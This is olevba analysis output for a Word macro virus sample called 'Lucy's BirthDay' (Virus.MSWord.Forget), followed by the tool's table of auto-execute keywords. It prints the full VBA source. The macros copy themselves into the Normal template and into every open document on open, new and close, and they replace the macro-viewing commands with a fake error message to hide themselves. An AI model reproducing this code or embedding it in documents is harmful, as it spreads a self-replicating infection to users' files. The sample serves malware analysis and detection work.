olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Forget
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Forget - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Lucy.bas 
in file: Virus.MSWord.Forget - OLE stream: 'Macros/VBA/Lucy'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoExec()
If Day(Date) = 8 Then
 Set Luz = Assistant.NewBalloon
With Luz
.Heading = "-   HackerNet say's   -"
.Text = "Today is the day of my sister's birthday don't forget ..."
.Animation = msoAnimationGetAttentionMajor
.Show
End With
Application.OnTime When:=Now + TimeValue("00:03:00"), Name:="AutoExec"
End If
End Sub
Sub AutoOpen()
With Application
orig = .ActiveDocument.FullName
dest = .NormalTemplate.FullName
On Error Resume Next
.OrganizerCopy Source:=orig, Destination:=dest, _
Name:="Lucy", Object:=wdOrganizerObjectProjectItems
For I = 1 To .Documents.Count
fls = .Documents.Item(I).FullName
On Error Resume Next
.OrganizerCopy Source:=dest, Destination:=fls, _
Name:="Lucy", Object:=wdOrganizerObjectProjectItems
Next I
End With
End Sub
Sub AutoNew()
AutoOpen
End Sub
Sub AutoClose()
AutoOpen
End Sub
Sub ToolsMacro()
x = MsgBox("Can not find application", vbCritical)
End Sub
Sub ViewVBCode()
ToolsMacro
End Sub
' VirusName =    Lucy's BirthDay
' I'm HackerNet.
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

